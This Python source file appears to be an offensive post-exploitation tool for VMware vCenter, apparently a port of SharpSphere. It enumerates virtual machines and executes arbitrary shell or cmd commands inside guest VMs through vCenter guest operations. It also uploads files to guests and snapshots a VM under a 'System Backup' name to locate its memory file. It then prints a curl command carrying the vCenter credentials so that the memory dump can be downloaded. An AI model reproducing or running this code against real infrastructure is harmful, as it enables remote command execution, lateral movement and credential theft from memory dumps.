import re
import time
import datetime
import requests
import string
import random
import tabulate

from urllib.parse import urlparse
from urllib.parse import quote, unquote

from pysharpsphere.lib import service_instance
from pyVmomi import vim


def scan_for_vms(obj, ret=None):
    if ret is None:
        ret = []

    if isinstance(obj, vim.VirtualMachine):
        ret.append(obj)
    elif isinstance(obj, vim.Folder):
        for child in obj.childEntity:
            scan_for_vms(child, ret)
    elif isinstance(obj, vim.VirtualApp):
        for vm in obj.vm:
            scan_for_vms(vm, ret)

    return ret


def get_snap_shot(vm):
    print('[*] Finding snapshot on target machine {}'.format(vm))
    if vm.snapshot is not None:
        print('[+] Found exists snapshot!')
        return vm.snapshot.currentSnapshot
    else:
        print('[*] No snapshot found, taking new snapshot ...')
        if vm.runtime.powerState != 'poweredOn':
            print('[-] VM is not powered on, no point snapshotting')
            exit(1)

        name = 'System Backup {}'.format(datetime.datetime.now())
        task = vm.CreateSnapshot_Task(name, name, True, True)

        while task.info.state != 'success':
            if task.info.state == 'error':
                print('[-] Error creating snapshot')
                exit(1)
            elif task.info.state == 'running':
                time.sleep(10)
            else:
                raise Exception('unknown state {}'.format(task.info.state))

        print('[+] Snapshot created successfully')
        return task.info.result


def print_vm(vm_list):
    table_header = ['DataCenter', 'Name', 'Power', 'OS', 'Tools', 'IP']
    table_body = []

    for item in vm_list:
        for obj in item['vm']:
            guest = obj.guest
            config = obj.config
            runtime = obj.runtime

            table_body.append([
                item['dc'].name,
                config.name,
                runtime.powerState[7:],
                config.guestFullName,
                guest.toolsVersionStatus2[10:],
                guest.ipAddress
            ])

    print(tabulate.tabulate(table_body, headers=table_header))


def download_file(host, port, uri, username, password):
    url = urlparse('https://{}:{}{}'.format(host, port, uri)).geturl()
    print('[+] Download command: curl -k -u \'{}:{}\' \'{}\''
          ' -o dump.vmem'.format(username, password, url))


class SharpSphere(object):
    _host = None
    _port = None
    _user = None
    _password = None

    service_content = None
    credential = None

    def __init__(self, args):
        self._host = args.host
        self._port = args.port
        self._username = args.user
        self._password = args.password

        si = service_instance.connect(args)
        self.service_content = si.RetrieveContent()

    def list_vm(self):
        print('[*] Retrieve virtual machines list ...')
        result = []
        child = self.service_content.rootFolder.childEntity

        datacenters = [i for i in child if isinstance(i, vim.Datacenter)]
        for dc in datacenters:
            folder = dc.vmFolder
            result.append({
                'dc': dc,
                'vm': scan_for_vms(folder),
            })

        return result

    def find_vm(self, ip_address):
        vms = self.list_vm()
        target_dc = None
        target_vm = None

        for item in vms:
            for vm in item['vm']:
                if vm.guest.ipAddress == ip_address:
                    target_dc = item['dc']
                    target_vm = vm
                    break

        if target_vm is None:
            print('[-] Virtual machine with ip address {} not found'.format(ip_address))
            exit(1)

        return target_vm, target_dc

    def execute_vm(self, ip_address, username, password, command, print_output=True):
        print('[*] Execute command on target virtual machine ...')
        target_vm, _ = self.find_vm(ip_address)

        process_manager = self.service_content.guestOperationsManager.processManager
        credential = vim.NamePasswordAuthentication(username=username, password=password,
                                                    interactiveSession=True)

        os_name = str(target_vm.config.guestFullName)
        fn = ''.join(random.choices(string.ascii_lowercase, k=6))

        if 'Microsoft Windows' in os_name:
            output = 'C:\\Users\\Public\\output_{}'.format(fn)
            arguments = '/c {} > {}'.format(command, output)
            program_path = 'C:\\Windows\\system32\\cmd.exe'
            working_directory = 'C:\\'
            print('[*] Target OS is Windows, using {} to execute command ...'.format(program_path))
        elif 'Linux' in os_name:
            output = '/tmp/output_{}'.format(fn)
            arguments = '-c \'{} > {}\''.format(command, output)
            program_path = '/bin/bash'
            working_directory = '/'
            print('[*] Target OS is Linux, using {} to execute command ...'.format(program_path))
        else:
            print('[-] Unknown operation system {}'.format(os_name))
            return exit(1)

        program_spec = vim.GuestProgramSpec(arguments=arguments, programPath=program_path,
                                            workingDirectory=working_directory)
        ret = process_manager.StartProgramInGuest(target_vm, credential, program_spec)
        print('[+] Process start successfully with PID {}'.format(ret))

        while print_output:
            time.sleep(3)
            try:
                process_info = process_manager.ListProcessesInGuest(target_vm, credential, [ret])
            except Exception as e:
                continue

            if len(process_info) == 0:
                print('[-] Error retrieving status of the process')
                exit(1)

            if process_info[0].exitCode:
                print('[*] Program exited, retrieving output ...')
                file_manager = self.service_content.guestOperationsManager.fileManager
                file_info = file_manager.InitiateFileTransferFromGuest(target_vm, credential, output)
                print(file_info.url)
                print('[*] Command output:')
                print(requests.get(file_info.url).text)
                break

    def dump_vm(self, ip_address):
        target_vm, target_dc = self.find_vm(ip_address)
        snapshot = get_snap_shot(target_vm)
        files = snapshot.config.files

        browser = target_vm.environmentBrowser.datastoreBrowser
        task = browser.SearchDatastore_Task(files.snapshotDirectory, vim.HostDatastoreBrowserSearchSpec(
            matchPattern='*.vmem',
            searchCaseInsensitive=True,
            details=vim.FileQueryFlags(
                fileOwner=True,
                fileSize=True,
                fileType=True,
                modification=True
            )
        ))

        print('[*] Finding snapshot files ...')
        while task.info.state != 'success':
            if task.info.state == 'error':
                print('[-] Error searching datastore for snapshot files')
                exit(1)
            elif task.info.state == 'running':
                time.sleep(10)
            else:
                raise Exception('unknown state {}'.format(task.info.state))

        results = task.info.result
        if not len(results.file):
            print('[-] Failed to find any .vmem files associated with the VM')

        last_file = None
        for file in results.file:
            if last_file is None or file.modification > last_file.modification:
                last_file = file

        match_ds_name = re.compile('^\[(.*?)\] .*$')
        ds_name = match_ds_name.findall(results.folderPath)[0]
        folder_path = results.folderPath[len(ds_name)+3:]

        uri = '/folder/{}{}?dcPath={}&dsName={}'.format(quote(folder_path),
                                                        quote(last_file.path),
                                                        quote(target_dc.name),
                                                        quote(ds_name))
        download_file(self._host, self._port, uri, self._username, self._password)

    def upload_file(self, ip_address, username, password, src, dest):
        target_vm, _ = self.find_vm(ip_address)
        print('[*] Uploading file to VM {} ...'.format(target_vm))

        credential = vim.NamePasswordAuthentication(username=username, password=password,
                                                    interactiveSession=True)
        file_manager = self.service_content.guestOperationsManager.fileManager

        with open(src, 'rb') as f:
            data = f.read()

        file_transfer_url = file_manager.InitiateFileTransferToGuest(target_vm, credential, dest,
                                                                     vim.GuestFileAttributes(),
                                                                     len(data), True)
        print('[*] Sending file data ...')
        print(requests.put(file_transfer_url, data=data).status_code)
        print('[+] Uploaded file to {}'.format(dest))
